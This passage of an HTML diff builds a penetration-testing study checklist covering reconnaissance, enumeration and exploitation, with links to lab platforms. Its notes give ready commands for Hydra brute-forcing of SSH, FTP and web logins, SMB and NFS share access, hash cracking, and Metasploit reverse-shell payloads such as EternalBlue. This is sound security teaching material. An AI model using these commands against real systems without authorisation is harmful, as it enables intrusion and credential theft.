+                                <div class="item-notes"><textarea data-note-id="m0-item9-note" placeholder="`import requests; response = requests.get('http://example.com')`. Basic socket connection. Reading/writing files. `for item in list: ...`. `if x > 10: ...`"></textarea></div>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Module 1 -->
+            <section class="module" data-module-id="module-1">
+                 <div class="module-header">
+                    <h3>Module 1: Reconnaissance & Information Gathering</h3>
+                     <div class="module-stats"><span class="progress-text">0 / 8</span></div>
+                    <span class="module-toggle"></span>
+                </div>
+                 <div class="module-content">
+                     <div class="module-progress"><div class="progress-text">Module Progress:</div><div class="progress-bar-container"><div class="progress-bar">0%</div></div></div>
+                     <ul class="checklist">
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m1-item0"><span class="item-title">Passive vs Active Reconnaissance</span></label><span class="difficulty-tag difficulty-beginner">Beginner</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand the difference: Passive uses publicly available info without direct interaction (OSINT), Active involves interacting with the target (port scanning, DNS zone transfers).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://www.comparitech.com/net-admin/active-vs-passive-reconnaissance/" target="_blank" rel="noopener noreferrer">Comparitech Article</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Conceptual</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m1-item0-note" placeholder="Passive = less risky, less detectable (WHOIS, Google). Active = more info, more risky (Nmap, dirbusting)."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m1-item1"><span class="item-title">Open Source Intelligence (OSINT) Techniques</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Leverage search engines (Google Dorking), social media analysis, job boards, company websites, public records, code repositories (GitHub), metadata analysis.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-brands fa-google"></i> <a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener noreferrer">Google Hacking Database (GHDB)</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://osintframework.com/" target="_blank" rel="noopener noreferrer">OSINT Framework</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/googledorking" target="_blank" rel="noopener noreferrer">THM: Google Dorking</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m1-item1-note" placeholder="Dorks: `site:target.com filetype:pdf`, `inurl:admin login`, `intitle:&quot;index of&quot;`. Tools: Maltego (visual), Recon-ng, SpiderFoot."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m1-item2"><span class="item-title">WHOIS & DNS Enumeration</span></label><span class="difficulty-tag difficulty-beginner">Beginner</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify domain ownership (`whois`), find IP addresses (`dig A`, `nslookup`), mail servers (`dig MX`), name servers (`dig NS`), potential zone transfers (`dig AXFR`). Use online tools like DNSDumpster.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-network-wired"></i> <a href="https://dnsdumpster.com/" target="_blank" rel="noopener noreferrer">DNSDumpster</a></div>
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://linux.die.net/man/1/dig" target="_blank" rel="noopener noreferrer">dig man page</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/dnsindetail" target="_blank" rel="noopener noreferrer">THM: DNS in Detail</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m1-item2-note" placeholder="`whois target.com`, `dig target.com ANY`, `dig @ns1.target.com target.com AXFR`. Look for contact emails, related domains, IP ranges."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m1-item3"><span class="item-title">Website Reconnaissance & Subdomain Enumeration</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Analyze website source code (comments, hidden fields), identify technologies (Wappalyzer, WhatWeb), find subdomains using search engines, certificate transparency logs, brute-forcing (Sublist3r, Amass, ffuf).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-magnifying-glass-chart"></i> <a href="https://www.wappalyzer.com/" target="_blank" rel="noopener noreferrer">Wappalyzer</a></div>
+                                     <div><i class="fa-solid fa-list"></i> <a href="https://crt.sh/" target="_blank" rel="noopener noreferrer">crt.sh (Cert Logs)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/webfundamentals" target="_blank" rel="noopener noreferrer">THM: Web Fundamentals</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m1-item3-note" placeholder="`whatweb target.com`, `sublist3r -d target.com`, `amass enum -d target.com`. Check `robots.txt`, `sitemap.xml`. Use browser dev tools (Ctrl+Shift+I)."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m1-item4"><span class="item-title">Infrastructure Reconnaissance (Shodan, etc.)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Utilize internet-wide scanners like Shodan, Censys, and Zoomeye to find exposed devices, services, banners, and potential vulnerabilities associated with a target organization or IP range.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-satellite-dish"></i> <a href="https://www.shodan.io/" target="_blank" rel="noopener noreferrer">Shodan</a></div>
+                                     <div><i class="fa-solid fa-satellite-dish"></i> <a href="https://search.censys.io/" target="_blank" rel="noopener noreferrer">Censys</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/shodan" target="_blank" rel="noopener noreferrer">THM: Shodan</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m1-item4-note" placeholder="Shodan queries: `org:&quot;Target Org&quot;`, `net:1.2.3.0/24`, `port:3389`, `product:&quot;Apache httpd&quot;`. Look for exposed login pages, default creds, vulnerable versions."></textarea></div>
+                             </div>
+                         </li>
+                          <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m1-item5"><span class="item-title">Email Harvesting</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Gather email addresses associated with a domain using tools like `theHarvester`, Hunter.io, Skrapp.io, and OSINT techniques (search engines, public docs).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-envelope"></i> <a href="https://hunter.io/" target="_blank" rel="noopener noreferrer">Hunter.io</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener noreferrer">theHarvester (GitHub)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Often part of OSINT rooms</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m1-item5-note" placeholder="`theHarvester -d target.com -l 500 -b google,linkedin`. Useful for phishing, password spraying. Validate found emails."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m1-item6"><span class="item-title">Social Engineering Concepts (Info Gathering Focus)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand how attackers gather information through pretexting (creating a scenario), elicitation (drawing out info subtly), phishing, baiting, and analyzing social media presence.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://www.social-engineer.org/framework/information-gathering/" target="_blank" rel="noopener noreferrer">Social-Engineer.org Framework</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/socialengineeringone" target="_blank" rel="noopener noreferrer">THM: Social Engineering</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m1-item6-note" placeholder="Goal: Gather intel on technology, employees, internal processes. Not direct exploitation yet. Linkedin for employee names/roles."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m1-item7"><span class="item-title">Documenting Reconnaissance Findings</span></label><span class="difficulty-tag difficulty-beginner">Beginner</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Emphasize the importance of structured note-taking. Use tools like CherryTree, Obsidian, Notion, KeepNote, or simple text files to organize domains, IPs, potential usernames, technologies, etc.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-note-sticky"></i> <a href="https://obsidian.md/" target="_blank" rel="noopener noreferrer">Obsidian</a></div>
+                                     <div><i class="fa-solid fa-book-open"></i> <a href="https://ippsec.rocks/?#reporting-and-note-taking" target="_blank" rel="noopener noreferrer">IppSec on Note Taking</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Practice during labs</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m1-item7-note" placeholder="Create a structure: Target Info, Domains/Subdomains, IPs, Open Ports, Services, Vulnerabilities, Credentials. Link notes together. Screenshots."></textarea></div>
+                             </div>
+                         </li>
+                     </ul>
+                 </div>
+            </section>
+
+            <!-- Module 2 -->
+            <section class="module" data-module-id="module-2">
+                 <div class="module-header"><h3>Module 2: Scanning & Enumeration</h3><div class="module-stats"><span class="progress-text">0 / 9</span></div><span class="module-toggle"></span></div>
+                 <div class="module-content">
+                     <div class="module-progress"><div class="progress-text">Module Progress:</div><div class="progress-bar-container"><div class="progress-bar">0%</div></div></div>
+                     <ul class="checklist">
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m2-item0"><span class="item-title">Network Scanning Concepts</span></label><span class="difficulty-tag difficulty-beginner">Beginner</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Host discovery (Ping sweeps, ARP scans), Port Scanning (TCP Connect, SYN Stealth, UDP, Xmas, FIN, Null), Service & Version Detection, OS Detection fundamentals.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://nmap.org/book/man-port-scanning-techniques.html" target="_blank" rel="noopener noreferrer">Nmap Scan Techniques</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/nmap01" target="_blank" rel="noopener noreferrer">THM: Nmap Live Host Discovery</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m2-item0-note" placeholder="SYN scan (-sS) is stealthier. TCP Connect (-sT) is reliable but noisy. UDP (-sU) is slow. Need root/admin for SYN scan."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m2-item1"><span class="item-title">Using Nmap Effectively</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Master common flags: `-p-` (all ports), `-sV` (version), `-O` (OS), `-sC` (default scripts), `--script` (specific scripts/categories), `-T<0-5>` (timing), `-oN`/`-oX`/`-oG` (output), `-Pn` (no ping), `-n` (no DNS).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://nmap.org/book/man.html" target="_blank" rel="noopener noreferrer">Nmap Manual</a></div>
+                                     <div><i class="fa-solid fa-screwdriver-wrench"></i> <a href="https://github.com/nmap/nmap/tree/master/scripts" target="_blank" rel="noopener noreferrer">Nmap Scripts (NSE)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/furthernmap" target="_blank" rel="noopener noreferrer">THM: Further Nmap</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m2-item1-note" placeholder="Common scan: `nmap -sC -sV -oN nmap_scan.txt target_ip`. Faster: `nmap -T4 -F target_ip` (Top 100 ports). Full: `nmap -p- -sV -oN nmap_full.txt target_ip`."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m2-item2"><span class="item-title">Vulnerability Scanning Concepts</span></label><span class="difficulty-tag difficulty-beginner">Beginner</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand automated scanning to identify known vulnerabilities (CVEs) based on detected services, versions, and configurations. Differentiate from port scanning. Awareness of false positives/negatives.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools" target="_blank" rel="noopener noreferrer">OWASP Vuln Scanning Tools</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Conceptual / Covered in tool usage</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m2-item2-note" placeholder="Scanners use databases of known vulns. Need to interpret results carefully. Requires Nmap results (services/versions) as input or performs its own scanning."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m2-item3"><span class="item-title">Using Vulnerability Scanners (Nessus / OpenVAS)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Install and configure Nessus Essentials (free) or OpenVAS/GVM. Run basic scans, interpret reports, understand severity ratings, and identify potential high-impact findings.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-shield-virus"></i> <a href="https://www.tenable.com/products/nessus/nessus-essentials" target="_blank" rel="noopener noreferrer">Nessus Essentials</a></div>
+                                     <div><i class="fa-solid fa-shield-virus"></i> <a href="https://www.greenbone.net/en/community-edition/" target="_blank" rel="noopener noreferrer">Greenbone (OpenVAS)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/nessusredux" target="_blank" rel="noopener noreferrer">THM: Nessus Redux</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m2-item3-note" placeholder="Setup can be complex. Scan configurations matter (credentialed vs uncredentialed). Focus on Critical/High findings first. Correlate with Nmap."></textarea></div>
+                             </div>
+                         </li>
+                          <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m2-item4"><span class="item-title">SMB/CIFS Enumeration (Windows File Sharing)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify open SMB ports (139, 445). List shares (`smbclient -L`, `nmap smb-enum-shares`), check for anonymous/guest access, list files, potentially download/upload. Tools: `enum4linux-ng`, `smbmap`.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-share-nodes"></i> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb" target="_blank" rel="noopener noreferrer">HackTricks SMB Pentesting</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/cddmp/enum4linux-ng" target="_blank" rel="noopener noreferrer">enum4linux-ng</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/attackingneptune" target="_blank" rel="noopener noreferrer">THM: Attacking Neptune (SMB Example)</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m2-item4-note" placeholder="`nmap -p 139,445 --script=smb-enum-shares,smb-os-discovery target_ip`. `smbclient -L //target_ip -N`. `smbclient //target_ip/share -N`. `enum4linux-ng target_ip`. `smbmap -H target_ip`. Look for sensitive files, config files, user dirs."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m2-item5"><span class="item-title">NFS Enumeration (Linux File Sharing)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify open NFS port (2049). List exported shares (`showmount -e target_ip`). Check share permissions (read/write, no_root_squash). Mount shares locally (`mount -t nfs`). Tools: `nmap nfs-* scripts`.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-share-nodes"></i> <a href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting" target="_blank" rel="noopener noreferrer">HackTricks NFS Pentesting</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/basicpentestingjt" target="_blank" rel="noopener noreferrer">THM: Basic Pentesting (NFS Example)</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m2-item5-note" placeholder="`nmap -p 111,2049 --script=nfs-ls,nfs-showmount target_ip`. `showmount -e target_ip`. `mkdir /mnt/nfs_share`. `mount -t nfs target_ip:/exported/share /mnt/nfs_share -o nolock`. Look for SSH keys, passwords, config files. Check `no_root_squash`."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m2-item6"><span class="item-title">SMTP Enumeration (Email Server)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify open SMTP port (25, 465, 587). Use commands like `VRFY` (verify user) and `EXPN` (expand mailing list) if enabled. Tools: `nmap smtp-commands`, `smtp-user-enum`.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-envelope-open-text"></i> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp" target="_blank" rel="noopener noreferrer">HackTricks SMTP Pentesting</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://pentester.land/cheatsheets/smtp-hacking-cheat-sheet.html" target="_blank" rel="noopener noreferrer">SMTP Cheatsheet</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m2-item6-note" placeholder="Connect: `nc target_ip 25`. Commands: `HELO test.com`, `VRFY username`, `EXPN listname`. Tool: `smtp-user-enum -M VRFY -U users.txt -t target_ip`. Often disabled now."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m2-item7"><span class="item-title">SNMP Enumeration (Network Management)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify open SNMP port (161 UDP). Brute-force community strings (e.g., 'public', 'private'). Walk the MIB tree to gather system info, network config, user accounts. Tools: `snmpwalk`, `snmp-check`, `onesixtyone`.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-network-wired"></i> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp" target="_blank" rel="noopener noreferrer">HackTricks SNMP Pentesting</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/agentsudo" target="_blank" rel="noopener noreferrer">THM: Agent Sudo (SNMP Example)</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m2-item7-note" placeholder="Community string bruteforce: `onesixtyone -c common_strings.txt target_ip`. Walk MIB: `snmpwalk -c public -v1 target_ip`. Tool: `snmp-check target_ip -c public`. Look for usernames, shares, software versions."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m2-item8"><span class="item-title">Web Server & Application Enumeration</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify web server software/version (Nmap, headers). Find hidden directories and files using brute-forcing tools (`gobuster`, `feroxbuster`, `dirsearch`, `ffuf`) with wordlists (e.g., `dirbuster`, `SecLists`). Fingerprint web technologies.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-list"></i> <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">SecLists (Wordlists)</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener noreferrer">gobuster</a> / <a href="https://github.com/epi052/feroxbuster" target="_blank" rel="noopener noreferrer">feroxbuster</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/gobuster" target="_blank" rel="noopener noreferrer">THM: GoBuster</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m2-item8-note" placeholder="`gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html`. `feroxbuster -u http://target_ip -w common.txt`. Look for login pages, config files (`.env`, `.git`), backups (`.bak`), admin interfaces."></textarea></div>
+                             </div>
+                         </li>
+                     </ul>
+                 </div>
+            </section>
+
+            <!-- Module 3 -->
+            <section class="module" data-module-id="module-3">
+                 <div class="module-header"><h3>Module 3: Gaining Access (Exploitation)</h3><div class="module-stats"><span class="progress-text">0 / 8</span></div><span class="module-toggle"></span></div>
+                 <div class="module-content">
+                     <div class="module-progress"><div class="progress-text">Module Progress:</div><div class="progress-bar-container"><div class="progress-bar">0%</div></div></div>
+                     <ul class="checklist">
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m3-item0"><span class="item-title">Understanding Vulnerabilities & Exploits</span></label><span class="difficulty-tag difficulty-beginner">Beginner</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Learn about CVE identifiers, CVSS scoring (severity). Find exploits using databases like Exploit-DB (`searchsploit` command-line tool) and Packet Storm. Understand exploit types (remote code execution, buffer overflow, etc.).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-database"></i> <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">Exploit Database</a></div>
+                                     <div><i class="fa-solid fa-circle-info"></i> <a href="https://nvd.nist.gov/vuln-metrics/cvss" target="_blank" rel="noopener noreferrer">CVSS Scoring System</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/exploitingavuln" target="_blank" rel="noopener noreferrer">THM: Exploiting a Vulnerability</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m3-item0-note" placeholder="`searchsploit <software_name> <version>`. Example: `searchsploit Apache 2.4.49`. Read exploit code carefully. Check compatibility. Understand Proof-of-Concept (PoC) vs full exploit."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m3-item1"><span class="item-title">Introduction to Metasploit Framework</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Start `msfconsole`. Understand workspaces, database integration (`db_nmap`), searching for modules (`search`), module types (exploit, auxiliary, payload, post, encoder), basic commands (`use`, `show options`, `info`).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://docs.metasploit.com/" target="_blank" rel="noopener noreferrer">Metasploit Documentation</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank" rel="noopener noreferrer">Metasploit Unleashed (OffSec)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/metasploitintro" target="_blank" rel="noopener noreferrer">THM: Metasploit Introduction</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m3-item1-note" placeholder="`msfdb init`, `msfconsole`. `workspace -a project_name`. `db_nmap -sV target_ip`. `search type:exploit platform:windows smb`. `use exploit/windows/smb/ms17_010_eternalblue`. `info`. `show options`."></textarea></div>
+                             </div>
+                         </li>
+                          <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m3-item2"><span class="item-title">Using Metasploit Modules (Exploits & Payloads)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Set required options (RHOSTS, RPORT, LHOST, LPORT). Choose appropriate payloads (e.g., `windows/meterpreter/reverse_tcp`, `linux/x64/shell/reverse_tcp`). Understand `exploit` / `run` command. Manage sessions (`sessions -l`, `sessions -i <id>`).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://docs.metasploit.com/docs/using-metasploit/basics/using-modules.html" target="_blank" rel="noopener noreferrer">Using Modules Guide</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/metasploitintro" target="_blank" rel="noopener noreferrer">THM: Metasploit Introduction</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m3-item2-note" placeholder="`set RHOSTS target_ip`. `set LHOST your_ip` (use `ip addr` or `ifconfig`). `show payloads`. `set payload windows/x64/meterpreter/reverse_tcp`. `exploit`. `sessions -l`. `sessions -i 1`. `background`."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m3-item3"><span class="item-title">Password Attack Concepts</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Online (against live service) vs Offline (against captured hash). Brute Force (trying all combinations), Dictionary Attack (using wordlists), Password Spraying (few common passwords against many users), Credential Stuffing (reusing breached credentials).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-key"></i> <a href="https://owasp.org/www-community/attacks/Password_Spraying_Attack" target="_blank" rel="noopener noreferrer">OWASP Password Spraying</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/hydra" target="_blank" rel="noopener noreferrer">THM: Hydra (Online Attacks)</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m3-item3-note" placeholder="Offline is faster and safer. Online risks account lockout. Password spraying avoids lockouts. Dictionary attacks need good wordlists."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m3-item4"><span class="item-title">Offline Password Cracking (John the Ripper / Hashcat)</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify hash types (e.g., LM, NTLM, MD5, SHA1, Kerberos). Obtain hashes (e.g., from `/etc/shadow`, SAM database, captured network traffic). Use JtR or Hashcat with wordlists, rules, and potentially mask attacks.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-hashtag"></i> <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener noreferrer">Hashcat Example Hashes</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://www.openwall.com/john/" target="_blank" rel="noopener noreferrer">John the Ripper</a> / <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener noreferrer">Hashcat</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/crackthehash" target="_blank" rel="noopener noreferrer">THM: Crack the Hash</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m3-item4-note" placeholder="`john --wordlist=rockyou.txt hash.txt`. `hashcat -m <mode> hash.txt wordlist.txt`. Identify mode: `hashid hash_string`. Get hashes from SAM/SYSTEM files (mimikatz, secretsdump). `/etc/shadow` requires root."></textarea></div>
+                             </div>
+                         </li>
+                          <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m3-item5"><span class="item-title">Online Password Attacks (Hydra)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Use Hydra to perform dictionary or brute-force attacks against live services like SSH, FTP, RDP, HTTP Basic/Form Auth. Understand syntax for different protocols and risk of lockouts.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener noreferrer">Hydra GitHub</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/hydra" target="_blank" rel="noopener noreferrer">THM: Hydra</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m3-item5-note" placeholder="SSH: `hydra -L users.txt -P passwords.txt target_ip ssh`. FTP: `hydra -l user -P pass.txt target_ip ftp`. HTTP POST: `hydra -l user -P pass.txt target_ip http-post-form &quot;/login.php:user=^USER^&pass=^PASS^:F=Invalid&quot;` Be careful!"></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m3-item6"><span class="item-title">Exploiting Common Service Misconfigurations</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Gain access through default credentials (e.g., admin/admin on web apps, default SNMP strings), anonymous FTP/SMB login with write access, weak file permissions on web servers, exposed databases.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-circle-exclamation"></i> <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials" target="_blank" rel="noopener noreferrer">SecLists Default Creds</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Found in many CTF/VulnHub boxes</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m3-item6-note" placeholder="Check anonymous FTP (`ftp target_ip` -> user: anonymous). Check SMB anonymous shares (`smbclient -L //target_ip -N`). Google default creds for identified software. Check web server file permissions."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m3-item7"><span class="item-title">Understanding Payloads & Shells</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Staged (small stager downloads full payload) vs Stageless (full payload sent at once). Reverse Shell (target connects back to attacker) vs Bind Shell (attacker connects to target). Meterpreter vs standard command shell.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-terminal"></i> <a href="https://www.offensive-security.com/metasploit-unleashed/payloads/" target="_blank" rel="noopener noreferrer">Metasploit Unleashed Payloads</a></div>
